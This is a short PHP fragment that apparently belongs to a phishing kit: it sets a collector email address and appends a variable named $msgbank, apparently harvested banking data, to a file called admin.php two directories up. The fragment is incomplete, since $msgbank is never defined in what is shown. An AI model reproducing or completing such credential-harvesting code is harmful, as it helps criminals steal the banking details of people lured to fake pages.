<?php

$yourmail  = 'm4rsha11.sp4m@yandex.ru';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>